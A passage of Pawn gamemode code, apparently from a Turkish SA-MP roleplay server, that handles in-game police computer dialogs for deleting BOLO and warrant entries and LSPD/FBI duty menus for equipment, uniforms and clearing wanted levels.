				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ Yapýldý | Baþarýlý! ","* MVB'e bir tutuklama emri detayý girdin. -Warrants\nTutuklama emirlerini görmek istiyorsan MVB'na giriþ yap.", "Tamam", "Geri");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MVB: Bir tutuklama emrinin detaylarý güncellendi.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MVB: Bir tutuklama emrinin detaylarý güncellendi.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MVB - Giriþ yapýldý | Hata! ", "8. Slot zaten kullanýlýyor.", "Tamam", "Geri");
				return 1;
			}
		}
	}
	if(dialogid == MDC_DELETE && response)
	{
	    if(listitem == 0)
	    {
	    	ShowPlayerDialogEx(playerid, MDC_DEL_BOLO, DIALOG_STYLE_LIST, "SA-MVB - Giriþ yapýldý | Hangi slottaki BOLO detayýný silmek istiyorsun?", "1\n2\n3\n4\n5\n6\n7\n8\nALL", "Gir", "Iptal");
	    }
		if(listitem == 1)
		{
			ShowPlayerDialogEx(playerid, MDC_DEL_WARRANT, DIALOG_STYLE_LIST, "SA-MVB - Oturum Açýldý | Hangi slottaki tutuklama emrini silmek istiyorsunuz?", "1\n2\n3\n4\n5\n6\n7\n8\nALL", "Gir", "Iptal");
		}
	}
	if(dialogid == MDC_DEL_BOLO && response)
	{
		new string1[MAX_PLAYER_NAME];
		if(isnull(inputtext))
		{
			ShowPlayerDialogEx(playerid, MDC_DEL_WARRANT, DIALOG_STYLE_LIST, "SA-MVB - Oturum Açýldý | Hangi slottaki tutuklama emrini silmek istiyorsunuz?", "1\n2\n3\n4\n5\n6\n7\n8\nALL", "Gir", "Iptal");
			return 1;
		}
		if(strcmp(inputtext, "1") == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd14], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact14], string1, 0, strlen(string1), 255);
			News[hTaken14] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* MVB'de bulunan (1). BOLO detayýný sildin -BOLO.");
			return 1;
		}
		else if(strcmp(inputtext, "2") == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd15], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact15], string1, 0, strlen(string1), 255);
			News[hTaken15] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* MVB'de bulunan (2). BOLO detayýný sildin -BOLO.");
			return 1;
		}
		else if(strcmp(inputtext, "3") == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd16], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact16], string1, 0, strlen(string1), 255);
			News[hTaken16] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* MVB'de bulunan (3). BOLO detayýný sildin -BOLO.");
			return 1;
		}
		else if(strcmp(inputtext, "4") == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd17], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact17], string1, 0, strlen(string1), 255);
			News[hTaken17] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* MVB'de bulunan (4). BOLO detayýný sildin -BOLO.");
			return 1;
		}
		else if(strcmp(inputtext, "5") == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd18], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact18], string1, 0, strlen(string1), 255);
			News[hTaken18] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* MVB'de bulunan (5). BOLO detayýný sildin -BOLO.");
			return 1;
		}
		else if(strcmp(inputtext, "6") == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd19], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact19], string1, 0, strlen(string1), 255);
			News[hTaken19] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* MVB'de bulunan (6). BOLO detayýný sildin -BOLO.");
			return 1;
		}
		else if(strcmp(inputtext, "7") == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd20], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact20], string1, 0, strlen(string1), 255);
			News[hTaken20] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* MVB'de bulunan (7). BOLO detayýný sildin -BOLO.");
			return 1;
		}
		else if(strcmp(inputtext, "8") == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd21], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact21], string1, 0, strlen(string1), 255);
			News[hTaken21] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* MVB'de bulunan (8). BOLO detayýný sildin -BOLO.");
			return 1;
		}
		else if(strcmp(inputtext,"all",true) == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd14], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact14], string1, 0, strlen(string1), 255);
			News[hTaken14] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd15], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact15], string1, 0, strlen(string1), 255);
			News[hTaken15] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd16], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact16], string1, 0, strlen(string1), 255);
			News[hTaken16] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd17], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact17], string1, 0, strlen(string1), 255);
			News[hTaken17] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd18], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact18], string1, 0, strlen(string1), 255);
			News[hTaken18] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd19], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact19], string1, 0, strlen(string1), 255);
			News[hTaken19] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd20], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact20], string1, 0, strlen(string1), 255);
			News[hTaken20] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd21], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact21], string1, 0, strlen(string1), 255);
			News[hTaken21] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* MVB'deki tüm BOLO detaylarýný sildin -BOLO.");
			return 1;
		}
	}
	if(dialogid == MDC_DEL_WARRANT && response)
	{
	    new string1[MAX_PLAYER_NAME];
		if(isnull(inputtext))
		{
			ShowPlayerDialogEx(playerid, MDC_DEL_WARRANT, DIALOG_STYLE_LIST, "SA-MVB - Oturum Açýldý | Hangi slottaki tutuklama emrini silmek istiyorsunuz?", "1\n2\n3\n4\n5\n6\n7\n8\nALL", "Gir", "Iptal");
			return 1;
		}
		if(strcmp(inputtext,"1",true) == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd6], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact6], string1, 0, strlen(string1), 255);
			News[hTaken6] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Tutuklama Emri (1)'in detaylarýný MVB'den sildin -Warrants.");
			return 1;
		}
		else if(strcmp(inputtext,"2",true) == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd7], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact7], string1, 0, strlen(string1), 255);
			News[hTaken7] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Tutuklama Emri (2)'in detaylarýný MVB'den sildin -Warrants.");
			return 1;
		}
		else if(strcmp(inputtext,"3",true) == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd8], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact8], string1, 0, strlen(string1), 255);
			News[hTaken8] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Tutuklama Emri (3)'in detaylarýný MVB'den sildin -Warrants.");
			return 1;
		}
		else if(strcmp(inputtext,"4",true) == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd9], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact9], string1, 0, strlen(string1), 255);
			News[hTaken9] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Tutuklama Emri (4)'in detaylarýný MVB'den sildin -Warrants.");
			return 1;
		}
		else if(strcmp(inputtext,"5",true) == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd10], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact10], string1, 0, strlen(string1), 255);
			News[hTaken10] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Tutuklama Emri (5)'in detaylarýný MVB'den sildin -Warrants.");
			return 1;
		}
		else if(strcmp(inputtext,"6",true) == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd11], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact11], string1, 0, strlen(string1), 255);
			News[hTaken11] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Tutuklama Emri (6)'in detaylarýný MVB'den sildin -Warrants.");
			return 1;
		}
		else if(strcmp(inputtext,"7",true) == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd12], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact12], string1, 0, strlen(string1), 255);
			News[hTaken12] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Tutuklama Emri (7)'in detaylarýný MVB'den sildin -Warrants.");
			return 1;
		}
		else if(strcmp(inputtext,"8",true) == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd13], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact13], string1, 0, strlen(string1), 255);
			News[hTaken13] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Tutuklama Emri (8)'in detaylarýný MVB'den sildin -Warrants.");
			return 1;
		}
		else if(strcmp(inputtext,"all",true) == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd6], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact6], string1, 0, strlen(string1), 255);
			News[hTaken6] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd7], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact7], string1, 0, strlen(string1), 255);
			News[hTaken7] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd8], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact8], string1, 0, strlen(string1), 255);
			News[hTaken8] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd9], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact9], string1, 0, strlen(string1), 255);
			News[hTaken9] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd10], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact10], string1, 0, strlen(string1), 255);
			News[hTaken10] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd11], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact11], string1, 0, strlen(string1), 255);
			News[hTaken11] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd12], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact12], string1, 0, strlen(string1), 255);
			News[hTaken12] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd13], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "Nobody");	strmid(News[hContact13], string1, 0, strlen(string1), 255);
			News[hTaken13] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Tüm tutuklama emir detaylarýný MVB'den sildiniz -Warrants.");
			return 1;
		}
	}
	if(dialogid == MDC_LOGOUT && response)
	{
	}
	if(dialogid == MDC_CREATE && response)
	{
	}
	if((dialogid >= MDC_START_ID && dialogid <= MDC_END_ID) && !response)
	{
	    if(dialogid == MDC_MAIN)
	    {
	        SendClientMessage(playerid, COLOR_LIGHTBLUE, "* MVB'den çýkýþ yaptýn.");
			ConnectedToPC[playerid] = 0;
	    }
	    else
		{
			ShowPlayerDialogEx(playerid, MDC_MAIN, DIALOG_STYLE_LIST, "SA-MVB - Giriþ yapýldý", "*Memur Bul\n*Sivil Bilgisi\n*Devlet Birimleri\n*MVB Mesajý\n*SMS", "Tamam", "Iptal");
		}
	}
	if(dialogid == SAN_DUTYMENU)
	{
 		if(response){
			if(PlayerInfo[playerid][pConnectTime] < 2)
				return SendClientMessage(playerid, COLOR_GRAD2, "Silah taþýman yasaklandýðýndan dolayý bunu kullanamazsýn!");

		    switch(listitem) {
				case 0: SetPlayerHealth(playerid, 100);
				case 1: SetPlayerArmourEx(playerid, 50.0);
				case 2: {
					if(GetPlayerCash(playerid) < 150)
						return SendClientMessage(playerid, COLOR_WHITE, "Bunun için paran yok.");

					GivePlayerCash(playerid, -150);
					GivePlayerValidWeapon(playerid, 25, 60000);
				}
				case 3: GivePlayerValidWeapon(playerid, 43, 60000);
			}
		}
	}
	if(dialogid == DUTYMENU)
	{
 		if(response)
		{
			if(listitem == 0) // LSPD Duty
			{
				if(PlayerInfo[playerid][pDuty]==0)
				{
					format(string, sizeof(string), "* Memur % rozetini ve silahýný dolabýndan alýr.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPlayerColor(playerid, TEAM_BLUE_COLOR);
					SetPlayerSkin(playerid, 280);
					PlayerInfo[playerid][pSkin] = 280;
	    			SetPlayerArmourEx(playerid, 100.0);
	    			SetPlayerHealth(playerid, 100.0);
					GivePlayerValidWeapon(playerid, 24, 99999);
					GivePlayerValidWeapon(playerid, 41, 99999);
					GivePlayerValidWeapon(playerid, 3, 99999);
					OnDuty[playerid] = 1;
					PlayerInfo[playerid][pDuty] = 1;
                    //ShowPlayerDialogEx(playerid, DUTY_OPTIONS, DIALOG_STYLE_LIST, "Duty Options","Public\nUndercover", "Seç", "Iptal");
				}
				else if(PlayerInfo[playerid][pDuty]==1)
				{
					format(string, sizeof(string), "* Memur % rozetini ve silahýný dolabýna koyar.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPlayerColor(playerid, TEAM_HIT_COLOR);
					SetPlayerArmourEx(playerid, 0.0);
					SetPlayerSkin(playerid, 46);
					PlayerInfo[playerid][pSkin] = 46;
					OnDuty[playerid] = 0;
					PlayerInfo[playerid][pDuty] = 0;
					PlayCrimeReportForPlayer(playerid, playerid, 21);
				}
			}
			if(listitem == 1) // LSPD Weapons
			{
				ShowPlayerDialogEx(playerid, DUTYMENU2, DIALOG_STYLE_LIST, "LSPD Ekipmanlarý","Sprey\nCop\nDesert Eagle\nSPAS-12	$700\nMP5\nM4\nAK-47\nSmoke Grenade\nShotgun\nRifle		$100\nSniper Rifle	$800\nZirh\nÝlkYardim\nAksesuarlar", "Satin Al", "Iptal");
			}
			if(listitem == 2) // LSPD Tactical
			{
				if(PlayerInfo[playerid][pDivision] == 5 || PlayerInfo[playerid][pRank] > 3) // S.W.A.T. division
				{
					GivePlayerValidWeapon(playerid, 24, 99999);
					GivePlayerValidWeapon(playerid, 41, 99999);
					GivePlayerValidWeapon(playerid, 3, 99999);
					GivePlayerValidWeapon(playerid, 31, 99999);
					GivePlayerValidWeapon(playerid, 17, 5);
					SetPlayerArmourEx(playerid, 100.0);
					SetPlayerHealth(playerid, 100);
					SetPlayerSkin(playerid, 285);
					PlayerInfo[playerid][pSkin] = 285;
					OnDuty[playerid] = 1;
					PlayerInfo[playerid][pDuty] = 1;
					format(string, sizeof(string), "* Memur % hýzlý bir þekilde taktiksel kýyafetini ve ekipmanlarýný alýr.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPlayerColor(playerid, TEAM_BLUE_COLOR);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD2, "S.W.A.T biriminden yada R5 üzeri deðilsin.");
				}
			}
			if(listitem == 3) // LSPD Uniforms
			{
				ShowPlayerDialogEx(playerid, DUTYMENU3, DIALOG_STYLE_LIST, "LSPD Üniformalarý","Cadet\nFemale Officer\nOfficer 1\nOfficer 2\nOfficer 3\nBlack Officer\nLatino Officer\nMotorcycle Officer\nSWAT Officer\nSergeant\nCaptain\nChief", "Giy", "Iptal");
			}
			if(listitem == 4) // LSPD Undercover Uniform
			{
				ShowPlayerDialogEx(playerid, FDUTYMENU4, DIALOG_STYLE_INPUT, "Gizli","Skin seçin (ID kullanarak).", "Seç", "Iptal");
			}
			if(listitem == 5) // LSPD Clear.
			{
				ShowPlayerDialogEx(playerid, DUTYMENU5,DIALOG_STYLE_INPUT,"LSPD","Kimi temize çýkarmak istiyorsun?","Temizle","Iptal");
    		}
		}
	}
	if(dialogid == DUTYMENU2)
	{
 		if(response)
		{
 			if(PlayerInfo[playerid][pConnectTime] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "Silah taþýman yasaklandýðýndan dolayý bunu kullanamazsýn!");
		    switch(listitem)
			{
				case 0: // LSPD Mace
				{
					GivePlayerValidWeapon(playerid, 41, 60000);
				}
				case 1: // LSPD Nite Stick
				{
					GivePlayerValidWeapon(playerid, 3, 60000);
				}
				case 2: // LSPD Deagle
				{
					GivePlayerValidWeapon(playerid, 24, 60000);
				}
				case 3: // LSPD Spas12 *
				{
					if(PlayerInfo[playerid][pRank] >= 2) {
					    if(GetPlayerCash(playerid) < 700)
							return SendClientMessage(playerid, COLOR_WHITE, "Bunun için paran yok.");

						GivePlayerCash(playerid, -700);
						GivePlayerValidWeapon(playerid, 27, 60000);
					}
					else
					{
						SendClientMessage(playerid, COLOR_GRAD2, "En az rütbe 2 olman gerek.");
					}
				}
				case 4: // LSPD mp5
				{
					GivePlayerValidWeapon(playerid, 29, 60000);
				}
				case 5: // LSPD m4 *
				{
    				if(PlayerInfo[playerid][pRank] >= 1)
			    	{
						GivePlayerValidWeapon(playerid, 31, 60000);
					}
					else
					{
						SendClientMessage(playerid, COLOR_GRAD2, "En az rütbe 1 olman gerek.");
					}
				}
				case 6: // LSPD ak-47 *
				{
    				if(PlayerInfo[playerid][pRank] >= 1)
			    	{
						GivePlayerValidWeapon(playerid, 30, 60000);
					}
					else
					{
						SendClientMessage(playerid, COLOR_GRAD2, "En az rütbe 1 olman gerek.");
					}
				}
				case 7: // LSPD Smoke Bomb *
				{
					if(PlayerInfo[playerid][pRank] >= 1)
					{
						GivePlayerValidWeapon(playerid, 17, 5);
					}
					else
					{
						SendClientMessage(playerid, COLOR_GRAD2, "En az rütbe 1 olman gerek.");
					}
				}
				case 8: // LSPD Shotgun
				{
					GivePlayerValidWeapon(playerid, 25, 60000);
				}
				case 9: // LSPD rifle
				{
					if(GetPlayerCash(playerid) < 100) return SendClientMessage(playerid, COLOR_WHITE, "Bunun için paran yok.");
					GivePlayerCash(playerid, -100);
					GivePlayerValidWeapon(playerid, 33, 60000);
				}
				case 10: // LSPD Sniper *
				{
					if(PlayerInfo[playerid][pRank] >= 2)
					{
 						if(GetPlayerCash(playerid) < 800) return SendClientMessage(playerid, COLOR_WHITE, "Bunun için paran yok.");
						GivePlayerCash(playerid, -800);
						GivePlayerValidWeapon(playerid, 34, 60000);
					}
					else
					{
						SendClientMessage(playerid, COLOR_GRAD2, "En az rütbe 3 olman gerek.");
					}
				}
				case 11: // LSPD Kevlar
				{
					SetPlayerArmourEx(playerid, 100.0);
				}
				case 12: SetPlayerHealth(playerid, 100);
				case 13: ShowPlayerDialogEx(playerid, BUYTOYSCOP, DIALOG_STYLE_MSGBOX, "Aksesuarlar", "Devlet memurlarýnýn aksesuar dolabýna hoþgeldiniz.","Devam", "Iptal");
			}
		}
	}
	if(dialogid == DUTYMENU3)
	{
 		if(response)
		{
			if(listitem == 0) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 71);
				PlayerInfo[playerid][pSkin] = 71;
			}
			if(listitem == 1) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 141);
				PlayerInfo[playerid][pSkin] = 141;
			}
			if(listitem == 2) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 280);
				PlayerInfo[playerid][pSkin] = 280;
			}
			if(listitem == 3) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 266);
				PlayerInfo[playerid][pSkin] = 266;
			}
			if(listitem == 4) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 281);
				PlayerInfo[playerid][pSkin] = 281;
			}
			if(listitem == 5) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 265);
				PlayerInfo[playerid][pSkin] = 265;
			}

			if(listitem == 6) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 267);
				PlayerInfo[playerid][pSkin] = 267;
			}
			if(listitem == 7) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 284);
				PlayerInfo[playerid][pSkin] = 284;
			}
			if(listitem == 8) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 285);
				PlayerInfo[playerid][pSkin] = 285;
			}
			if(listitem == 9) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 282);
				PlayerInfo[playerid][pSkin] = 282;
			}
			if(listitem == 10) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 283);
				PlayerInfo[playerid][pSkin] = 283;
			}
			if(listitem == 11) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 288);
				PlayerInfo[playerid][pSkin] = 288;
			}
		}
	}
	if(dialogid == DUTYMENU4)
	{
 		if(response)
		{
			if(listitem == 0) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 223);
				PlayerInfo[playerid][pSkin] = 223;
			}
			if(listitem == 1) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 120);
				PlayerInfo[playerid][pSkin] = 120;
			}
			if(listitem == 2) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 240);
				PlayerInfo[playerid][pSkin] = 240;
			}
			if(listitem == 3) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 296);
				PlayerInfo[playerid][pSkin] = 296;
			}
			if(listitem == 4) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 137);
				PlayerInfo[playerid][pSkin] = 137;
			}
			if(listitem == 5) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 214);
				PlayerInfo[playerid][pSkin] = 214;
			}
			if(listitem == 6) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 147);
				PlayerInfo[playerid][pSkin] = 147;
			}
			if(listitem == 7) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 150);
				PlayerInfo[playerid][pSkin] = 150;
			}
			if(listitem == 8) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 201);
				PlayerInfo[playerid][pSkin] = 201;
			}
			if(listitem == 9) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 162);
				PlayerInfo[playerid][pSkin] = 162;
			}
			if(listitem == 10) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 29);
				PlayerInfo[playerid][pSkin] = 29;
			}
			if(listitem == 11) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 270);
				PlayerInfo[playerid][pSkin] = 270;
			}
			if(listitem == 12) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 59);
				PlayerInfo[playerid][pSkin] = 59;
			}
		}
	}
    if(dialogid == DUTYMENU5)
	{
	    if(response)
    	{
            new giveplayerid = ReturnUser(inputtext);
			//giveplayerid = strval(inputtext);
			if(IsPlayerConnected(giveplayerid))
			{
				if(giveplayerid != INVALID_PLAYER_ID)
				{
					format(string, sizeof(string), "* %s adlý kiþinin tüm kayýtlarýný ve aranma seviyelerini sildin.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Memur %s, senin üzerindeki tüm kayýtlarý ve aranma seviyelerini temizledi.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Memur %s, %s üzerindeki tüm kayýtlarý ve aranma seviyelerini temizledi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					SendRadioMessage(1, RADIO, string);
					SendRadioMessage(2, RADIO, string);
					PlayerInfo[giveplayerid][pWantedLevel] = 0;
					SetPlayerToTeamColor(giveplayerid);
				    SetPlayerWantedLevel(giveplayerid, 0);
        			ClearCrime(giveplayerid);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
				}
			}
		}
	}
	if(dialogid == FDUTYMENU)
	{
 		if(response)
		{
			if(listitem == 0) // FBI Duty
			{
				if(PlayerInfo[playerid][pDuty]==0)
				{
					format(string, sizeof(string), "* Ajan %s silahýný ve rozetini dolabýndan alýr.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPlayerColor(playerid, TEAM_FBI_COLOR);
					SetPlayerArmourEx(playerid, 100.0);
					SetPlayerHealth(playerid, 100.0);
					GivePlayerValidWeapon(playerid, 24, 99999);
					GivePlayerValidWeapon(playerid, 41, 99999);
					GivePlayerValidWeapon(playerid, 3, 99999);
					GivePlayerValidWeapon(playerid, 29, 99999);
					OnDuty[playerid] = 1;
					PlayerInfo[playerid][pDuty] = 1;
				}
				else if(PlayerInfo[playerid][pDuty]==1)
				{
					format(string, sizeof(string), "* Ajan %s silahýný ve rozetini dolaba koyar. ", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPlayerColor(playerid, TEAM_HIT_COLOR);
					SetPlayerSkin(playerid, 46);
					PlayerInfo[playerid][pSkin] = 46;
					SetPlayerArmourEx(playerid, 0.0);
					OnDuty[playerid] = 0;
					PlayerInfo[playerid][pDuty] = 0;
				}
			}
			if(listitem == 1) // FBI Weapons
			{
				ShowPlayerDialogEx(playerid, FDUTYMENU2, DIALOG_STYLE_LIST, "FBI Silahlari","Desert Eagle\nShotgun\nSPAS-12	$700\nMP5\nM4\nAK-47\nSmoke Grenade\nCamera\nSniper Rifle	$800\nTactical Vest\nÝlkYardim\nYerleþtirilebilir Kamera	$200\nAccessories", "Satin Al", "Iptal");
			}
			if(listitem == 2) // FBI SWAT Uniform
			{
                if(PlayerInfo[playerid][pRank] > 3)
				{
    				SetPlayerSkin(playerid, 285);
	    			PlayerInfo[playerid][pSkin] = 285;
				}
				else
				{
    				SendClientMessage(playerid, COLOR_GRAD2, "Yeterli rütbede deðilsin!");
    				return 1;
				}
			}
			if(listitem == 3) // FBI Uniforms
			{
				ShowPlayerDialogEx(playerid, FDUTYMENU3, DIALOG_STYLE_LIST, "FBI Üniformalarý","Paltolu Ajan\nSiyahi Ajan\nBeyaz Ajan\nAsyali Ajan\nAsyali Ajan 2\nSWAT\nBayan", "Giy", "Iptal");
			}
			if(listitem == 4) // FBI Undercover Uniform
			{
				ShowPlayerDialogEx(playerid, FDUTYMENU4, DIALOG_STYLE_INPUT, "Gizli","Skin seçin (ID kullanarak).", "Seç", "Iptal");
			}
			if(listitem == 5) // FBI Clear.
			{
				ShowPlayerDialogEx(playerid,FDUTYMENU5,DIALOG_STYLE_INPUT,"FBI","Kimi temize çýkarmak istiyorsun?","Temizle","Geri Don");
    		}
		}
	}
	if(dialogid == FDUTYMENU2)
	{
 		if(response)
		{
 			if(PlayerInfo[playerid][pConnectTime] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "Silah taþýman yasaklandýðýndan dolayý bunu kullanamazsýn!");
				else switch(listitem) {
				case 0: // FBI Weapons
				{
					GivePlayerValidWeapon(playerid, 24, 99999);
				}
				case 1: // FBI Weapons
				{
					GivePlayerValidWeapon(playerid, 25, 99999);
				}
				case 2: // FBI Weapons
				{
					if(GetPlayerCash(playerid) < 700) return SendClientMessage(playerid, COLOR_WHITE, "Bunun için paran yok.");
					GivePlayerCash(playerid, -700);
					GivePlayerValidWeapon(playerid, 27, 99999);
				}
				case 3: // FBI Weapons
				{
					GivePlayerValidWeapon(playerid, 29, 99999);
				}
				case 4: // FBI Weapons
				{
					GivePlayerValidWeapon(playerid, 31, 99999);
				}
				case 5: // FBI Weapons
				{
					GivePlayerValidWeapon(playerid, 30, 99999);
				}
				case 6: // FBI Weapons
				{
					GivePlayerValidWeapon(playerid, 17, 5);
				}
				case 7: // FBI Weapons
				{
